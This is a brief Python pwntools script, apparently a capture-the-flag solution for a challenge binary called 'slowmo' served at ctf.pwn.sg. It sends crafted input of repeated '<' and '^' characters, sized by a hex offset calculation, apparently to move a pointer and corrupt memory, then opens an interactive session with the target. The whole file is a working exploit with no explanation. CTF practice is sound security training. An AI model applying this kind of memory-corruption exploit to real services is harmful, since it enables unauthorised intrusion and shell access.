from pwn import *

if args.REMOTE:
    p = remote('ctf.pwn.sg', 4005)
else:
    p = process('./slowmo')
p.send('<'*128)
p.send('^'*(0xcc-0xb4))
p.send('!')

p.interactive()
    


